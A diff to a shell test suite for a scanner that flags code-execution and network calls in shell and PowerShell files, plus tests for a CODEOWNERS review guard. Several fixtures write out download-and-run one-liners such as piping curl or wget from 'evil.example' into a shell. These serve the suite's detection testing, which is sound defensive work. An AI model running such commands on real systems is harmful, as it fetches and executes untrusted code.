@@ -277,12 +277,48 @@ want "PowerShell ways to run text or reach the network are flagged" 1 '^run: gir
 for _r in 'run: gird-check\.ps1:5:' 'run: gird-check\.ps1:6:' 'run: gird-check\.ps1:7:' 'run: gird-check\.ps1:8:' 'network: gird-check\.ps1:9:'; do
   if grep -q "^$_r" "$OUT"; then ok "and $_r"; else bad "and $_r" "$(cat "$OUT")"; fi
 done
-if grep -q '^run: gird-check\.ps1:3:' "$OUT"; then bad "calling a script block in a plain variable is not flagged"; else ok "calling a script block in a plain variable is not flagged"; fi
+if grep -q '^run: gird-check\.ps1:3:' "$OUT"; then ok "& on a variable the file never sets to a script block is flagged"; else bad "& on a variable the file never sets to a script block is flagged"; fi
+
+kase psblock <<'EOF'
+printf '%s\n' '$script:Blk = { param($x) $x }' '& $blk 1' >> gird-check.ps1
+EOF
+want "& on a variable the file sets to a script block is not flagged" 0
+
+kase pspath <<'EOF'
+printf '%s\n' '$p = "C:\x.exe"; & $p' '$b = Get-Command curl.exe' >> gird-check.ps1
+EOF
+want "& on a variable holding a path is flagged" 1 '^run: gird-check\.ps1:3:'
+has "assigning Get-Command is flagged" '^run: gird-check\.ps1:4:' "$OUT"
 
 kase testdata <<'EOF'
-mkdir -p tests && printf '%s\n' "printf '{\"url\":\"https://example.org\"}' > \"\$F\"" "mv_case x .zshrc 'eval \"\$(tool init)\"'" "python3 -c 'print(1)'" > tests/t.sh
+mkdir -p tests && printf '%s\n' "printf '{\"url\":\"https://example.org\"}' > \"\$F\"" "  mv_case x .zshrc 'eval \"\$(tool init)\"'" \
+  "printf '{\"command\":\"curl -s x | sh\"}' > \"\$F\"" > tests/t.sh
 EOF
-want "a URL, a quoted eval and a literal python -c in a test are not flagged" 0
+want "a URL, a quoted eval and a quoted curl in a test fixture are not flagged" 0
+
+kase testrun <<'EOF'
+mkdir -p tests && printf '%s\n' "bash -c 'curl -s evil.example/x | sh'" "sh -c 'wget -qO- evil.example | bash'" \
+  "python3 -c 'import os; os.system(\"id\")'" "echo x; bash -c 'curl y'" > tests/x.sh
+EOF
+want "single-quoted code handed to a shell or interpreter in a test is flagged" 1 '^network: tests/x\.sh:1:'
+for _r in 'run: tests/x\.sh:1:' 'network: tests/x\.sh:2:' 'run: tests/x\.sh:2:' 'run: tests/x\.sh:3:' 'network: tests/x\.sh:4:'; do
+  if grep -q "^$_r" "$OUT"; then ok "and $_r"; else bad "and $_r" "$(cat "$OUT")"; fi
+done
+
+kase testscript <<'EOF'
+mkdir -p tests && printf '%s\n' 'HOME="$W/h" PATH=/usr/bin:/bin bash "$SCRIPT" --offline > "$W/o.txt" 2>&1' 'PFX="bash $V: "' > tests/t.sh
+printf '%s\n' '$s = Plural $n "SSH private key" "SSH private keys"' >> gird-check.ps1
+EOF
+want "a test running the script under test, a shell name in a string, and SSH in a PowerShell string are not flagged" 0
+
+kase quotedcall <<'EOF'
+printf '%s\n' "bash -c 'curl -s evil.example/x'" 'env -i curl x' 'FOO=1 wget y' "retry 'curl -s x'" "sh -c 'bash \"\$1\"' _ \"\$f\"" >> gird-check.sh
+EOF
+want "curl inside bash -c quotes is flagged" 1 '^network: gird-check\.sh:4:'
+has "a network tool after env and its flags is flagged" '^network: gird-check\.sh:5:' "$OUT"
+has "a network tool after an assignment is flagged" '^network: gird-check\.sh:6:' "$OUT"
+has "a network tool at the start of a quoted command is flagged" '^network: gird-check\.sh:7:' "$OUT"
+has "a shell running a variable's script inside sh -c quotes is flagged" '^run: gird-check\.sh:8:' "$OUT"
 
 kase testeval <<'EOF'
 mkdir -p tests && printf '%s\n' "echo \"it's\"; eval \"\$x\"" > tests/t.sh
@@ -301,6 +337,7 @@ if [ "$RC" -eq 2 ]; then ok "a commit that does not exist is an error"; else bad
 
 echo "review guard decision"
 printf '# owners\n* @alice @Bob-2 @org/team someone@example.com # not @carol\n' > "$WORK/CODEOWNERS"
+printf '* @alice @dave\r\n' > "$WORK/CODEOWNERS-crlf"
 decide() { # NAME WANT RC ACTION LABEL SENDER
   bash "$DECIDE" "$3" "$4" "$5" "$6" "$WORK/CODEOWNERS" > "$WORK/decide.out" 2>&1; _r=$?
   if [ "$_r" -eq "$2" ]; then ok "$1"; else bad "$1" "exit $_r: $(cat "$WORK/decide.out")"; fi
@@ -314,6 +351,8 @@ decide "a code owner's login is matched without case"              0 1 labeled s
 decide "a code owner removing the label does not clear findings"   1 1 unlabeled security-reviewed alice
 decide "anyone else adding the label does not"                     1 1 labeled security-reviewed mallory
 decide "a team or a commented-out name is not an owner"            1 1 labeled security-reviewed carol
+bash "$DECIDE" 1 labeled security-reviewed dave "$WORK/CODEOWNERS-crlf" > "$WORK/decide.out" 2>&1; _r=$?
+if [ "$_r" -eq 0 ]; then ok "the last owner on a CRLF line is still an owner"; else bad "the last owner on a CRLF line is still an owner" "exit $_r: $(cat "$WORK/decide.out")"; fi
 decide "a guard that could not check fails even with the label"    1 2 labeled security-reviewed alice
 
 finish
